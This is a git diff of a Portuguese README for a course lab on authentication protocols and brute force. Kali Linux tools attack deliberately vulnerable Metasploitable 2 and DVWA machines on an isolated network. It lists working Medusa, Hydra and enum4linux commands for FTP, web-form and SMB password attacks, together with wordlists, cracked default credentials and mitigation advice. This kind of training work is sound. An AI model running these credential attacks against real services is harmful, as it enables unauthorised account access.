@@ -1,181 +1,180 @@
-# Protocolos-de-Autentica-o-Brute-force
+# Dio – Santander – Cibersegurança 2025  
+## Protocolos de Autenticação & Brute Force  
 
-Desafio Dio Santander
+**Instrutora:** Isadora Ferrão  
 
-Projeto Prático – Cibersegurança 2025
+---
 
-Curso: Protocolos de Autenticação & Brute Force
+## 🎯 Objetivo  
 
-Instrutora: Isadora Ferrão
+Implementar e documentar um projeto prático utilizando **Kali Linux** e a ferramenta **Medusa**, em conjunto com os ambientes vulneráveis **Metasploitable 2** e **DVWA**, simulando ataques de **força bruta** e explorando medidas de **prevenção e mitigação**.  
 
-Plataforma: DIO + Santander
+---
 
-Objetivo
+## 🧩 Configuração do Ambiente  
 
-Desenvolver, documentar e compartilhar um projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis (como Metasploitable 2 e DVWA), para simular cenários de ataques de força bruta e aplicar medidas de mitigação.
+- **Duas VMs** no VirtualBox:
+  - **Kali Linux:** máquina atacante.  
+  - **Metasploitable 2:** máquina alvo.  
+- **Rede:** Host-only (interna).  
+- **Login padrão do Metasploitable 2:**  
+  ```
+  msfadmin : msfadmin
+  ```
 
-Etapas do Projeto
+---
 
-1. Configuração do Ambiente
+## ⚙️ Ferramentas Utilizadas  
 
-•	Criação de duas máquinas virtuais (Kali Linux e Metasploitable 2) no VirtualBox.
+| Ferramenta | Função Principal |
+|-------------|------------------|
+| **Nmap** | Varredura e identificação de serviços e versões. |
+| **Medusa** | Ataques de força bruta em serviços de rede. |
+| **Hydra** | Ataques de brute force via HTTP e outros protocolos. |
+| **Enum4linux** | Enumeração de usuários e recursos SMB. |
+| **John the Ripper** | Quebra de senhas a partir de hashes. |
+| **WPScan** | Auditoria de sites WordPress. |
+| **Ncrack** | Brute force em autenticações de rede. |
 
-•	Rede interna configurada em modo “host-only”.
+---
 
-2. Ataques Simulados
+## 🔐 Protocolos de Autenticação  
 
-•	Força bruta em FTP.
+- **HTTP Basic / Digest:** simples, usado em web (inseguro sem HTTPS).  
+- **Form-based:** formulários HTML.  
+- **NTLM / SMB:** autenticação de compartilhamento de arquivos.  
+- **Kerberos:** usado em ambientes Active Directory.  
+- **LDAP / AD Bind:** autenticação em diretórios.  
+- **SSH:** autenticação por senha ou chave pública.  
+- **RDP:** acesso remoto com suporte a NLA/Kerberos.  
+- **OAuth / OpenID Connect:** autenticação moderna para web e APIs.  
 
-•	Automação de tentativas em formulário web (DVWA).
+---
 
-•	Password spraying em SMB com enumeração de usuários.
+## 🧠 Tipos de Ataques de Força Bruta  
 
-3. Documentação dos Testes
+- **Online brute-force:** tentativa direta contra o serviço.  
+- **Offline brute-force:** quebra de hashes localmente.  
+- **Credential stuffing:** uso de combos vazados (e-mail:senha).  
+- **Password spraying:** testar poucas senhas em vários usuários.  
+- **Dictionary attack:** uso de wordlists e mutações de palavras.  
 
-•	Uso de wordlists simples.
+---
 
-•	Registro dos comandos utilizados.
+## 🧪 Etapas Práticas  
 
-•	Validação de acessos obtidos.
+### 1️⃣ Varredura de Rede com Nmap  
 
-•	Recomendações de mitigação.
+```bash
+nmap -sV -p 21,22,80,139,445 192.168.56.103
+```
 
-Conceitos Fundamentais
+**Resultado:**  
+- FTP (vsftpd 2.3.4) — vulnerável.  
+- SSH (OpenSSH 4.7p1) — versão antiga.  
+- HTTP (Apache 2.2.8) — desatualizado.  
+- SMB (Samba 3.x–4.x) — com workgroup padrão “WORKGROUP”.
 
-Protocolos de Autenticação
+---
 
-São métodos utilizados para validar a identidade de usuários ou serviços antes de conceder acesso. Exemplos:
+### 2️⃣ Ataque FTP com Medusa  
 
-•	HTTP Basic/Digest: simples, usado em aplicações web.
+**Preparação:**
+```bash
+echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt
+echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt
+```
 
-•	Form-based: autenticação via formulários HTML.
-
-•	NTLM/SMB: protocolo legado da Microsoft.
-
-•	Kerberos: baseado em tickets, usado em ambientes AD.
-
-•	LDAP/AD Bind: autenticação em diretórios.
-
-•	SSH: autenticação por senha ou chave pública.
-
-•	RDP: acesso remoto a desktops Windows.
-
-•	OAuth/OpenID Connect: autenticação moderna para APIs e web apps.
-
-Tipos de Ataques de Força Bruta
-
-•	Online brute-force: tentativa direta contra serviços ativos.
-
-•	Offline brute-force: quebra de hashes localmente.
-
-•	Credential stuffing: uso de credenciais vazadas.
-
-•	Password spraying: teste de senhas comuns em múltiplos usuários.
-
-•	Dictionary attacks: uso de listas de palavras com variações.
-
-Ferramentas Utilizadas
-
-•	Kali Linux: sistema operacional voltado para segurança da informação.
-
-•	Metasploitable 2: VM Linux vulnerável para testes.
-
-•	Medusa: ferramenta de brute-force rápida e paralela.
-
-•	Hydra: ferramenta de brute-force para diversos serviços.
-
-•	Ncrack: focada em autenticação de rede.
-
-•	John the Ripper: quebra de senhas a partir de hashes.
-
-•	WPScan: auditoria de segurança em sites WordPress.
-
-•	Nmap: varredura de rede e detecção de serviços.
-
-•	Enum4linux: enumeração de usuários e serviços SMB.
-
-Execução dos Testes
-
-Varredura de Rede com Nmap
-
-nmap -sV -p 21,22,80,445,139 192.168.56.103
-
-Resultado: portas FTP, SSH, HTTP e SMB abertas, todas com versões vulneráveis.
-
-Ataque FTP com Medusa
-
+**Ataque:**
+```bash
 medusa -h 192.168.56.103 -U users.txt -P pass.txt -M ftp -t 6 -f
+```
 
-Credenciais encontradas: msfadmin:msfadmin.
+**Resultado:**
+```
+ACCOUNT FOUND: [ftp] Host: 192.168.56.103 User: msfadmin Password: msfadmin [SUCCESS]
+```
 
-Teste de Login via Cliente FTP
+---
 
-ftp 192.168.56.103
+### 3️⃣ Ataque a Formulário Web (DVWA) com Hydra  
 
-Acesso confirmado com comandos como ls, get, put, etc.
-
-Ataque a Formulário Web (DVWA)
-
-Como o módulo http-m do Medusa não estava disponível, foi utilizado o Hydra:
-
+```bash
 hydra -L users.txt -P pass.txt 192.168.56.103 http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -t 6
+```
 
-Credenciais encontradas: admin:password.
+**Resultado:**
+```
+[80][http-post-form] host: 192.168.56.103 login: admin password: password
+```
 
- Ataque SMB com Enumeração e Password Spraying
+*(O módulo `http-m` do Medusa apresentou erro, por isso foi utilizado o Hydra.)*
 
+---
+
+### 4️⃣ Ataque SMB (Password Spraying)  
+
+**Enumeração de usuários:**
+```bash
 enum4linux -a 192.168.56.103 | tee enum_output.txt
+```
 
-Usuários identificados: msfadmin, root, postgre, usr, nservice.
+**Criação de listas:**
+```bash
+echo -e 'user\nmsfadmin\nservice' > smb_users.txt
+echo -e 'password\n123456\nWelcome\nmsfadmin' > senhas_spray.txt
+```
 
-Ataque com Medusa:
+**Ataque:**
+```bash
+medusa -h 192.168.56.103 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2
+```
 
-medusa -h 192.168.56.103 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+**Resultado:**
+```
+ACCOUNT FOUND: [smbnt] Host: 192.168.56.103 User: msfadmin Password: msfadmin [SUCCESS]
+```
 
-Credenciais válidas: msfadmin:msfadmin.
-
-Validação com smbclient:
-
+**Validação do acesso:**
+```bash
 smbclient -L //192.168.56.103 -U msfadmin
+```
 
-Acesso confirmado aos shares: print$, tmp, opt, ADMIN$, msfadmin.
+---
 
-Medidas de Mitigação
+## 🧱 Mitigações Recomendadas  
 
-Autenticação
+### 🔒 Autenticação e Senhas  
+- Usar **MFA/2FA** em contas críticas.  
+- Exigir **senhas fortes e únicas** (mínimo 12 caracteres).  
+- Implementar **expiração periódica** e bloqueio após falhas.  
+- Preferir **chaves SSH** em vez de senhas.  
 
-•	Implementar MFA/2FA.
+### 🚫 Controle e Bloqueio  
+- Aplicar **rate limiting** e bloqueio de IPs suspeitos.  
+- Definir **limite de tentativas por conta/IP**.  
 
-•	Exigir senhas fortes e únicas.
+### 📈 Monitoramento  
+- Coletar e analisar **logs de autenticação**.  
+- Configurar **alertas em tempo real**.  
+- Realizar **auditorias regulares** e **pentests autorizados**.  
 
-•	Utilizar autenticação por chave pública (SSH).
+### 🧩 Hardening e Rede  
+- Atualizar serviços vulneráveis (ex.: vsftpd, Samba, Apache).  
+- Substituir **FTP por SFTP/FTPS**.  
+- Desativar **SMBv1** e ativar **SMB signing/encryption**.  
+- Segmentar redes e restringir acessos administrativos.  
+- Exigir **TLS/HTTPS** em todos os logins.  
 
-Controle de Acesso
+---
 
-•	Limitar tentativas por IP/usuário.
+## 🧭 Conclusão  
 
-•	Bloquear contas após múltiplas falhas.
+A segurança não depende apenas de firewalls ou antivírus.  
+Falhas humanas e negligência organizacional continuam sendo vetores críticos de vulnerabilidade.  
+A conscientização, o uso ético de ferramentas e a prática constante são os pilares da **cibersegurança moderna**.  
 
-•	Monitorar e alertar sobre tentativas suspeitas.
+---
 
-Hardening de Serviços
-
-•	Atualizar softwares vulneráveis.
-
-•	Aplicar patches de segurança.
-
-•	Remover serviços desnecessários.
-
-Proteção de Rede
-
-•	Desabilitar SMBv1.
-
-•	Usar FTPS/SFTP em vez de FTP.
-
-•	Segmentar redes e configurar firewalls adequadamente.
-
- Conclusão
-
-A segurança da informação vai muito além de antivírus e firewalls. É essencial considerar fatores humanos, políticas organizacionais e práticas de defesa proativas. O conhecimento técnico aliado à conscientização é a chave para ambientes mais seguros.
-A segurança da informação vai muito além de antivírus e firewalls. É essencial considerar fatores humanos, políticas organizacionais e práticas de defesa proativas. O conhecimento técnico aliado à conscientização é a chave para ambientes mais seguros.
-
+📘 **Autor:** Roberto Yasuhiko Takushi  
+📅 **Ano:** 2025  
